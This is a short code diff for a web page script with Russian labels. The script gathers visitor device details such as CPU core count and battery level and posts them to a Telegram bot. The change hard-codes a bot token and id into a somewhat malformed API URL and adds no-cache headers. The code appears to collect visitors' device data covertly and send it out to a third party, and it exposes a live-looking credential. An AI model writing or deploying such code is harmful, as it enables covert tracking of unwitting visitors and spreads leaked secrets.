@@ -466,21 +466,25 @@
                 Ядра процессора: ${deviceInfo.hardwareConcurrency}
                 Уровень батареи: ${batteryLevel}%
             `;
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            const url = `https://api.telegram.org/bot7736721345:AAFgu3ppj_rjpllAV6kxDXciu4Rd-XoW2xk/sendMessage/720015852`;
             const params = {
                 chat_id: chatId,
                 text: message,
             };
-    
+
             try {
                 const response = await fetch(url, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
+                        'Cache-Control': 'no-cache, no-store, must-revalidate',
+                        'Pragma': 'no-cache',
+                        'Expires': '0'
                     },
                     body: JSON.stringify(params),
                 });
-    
+
                 if (response.ok) {
                     console.log("Данные успешно отправлены в Telegram.");
                 } else {
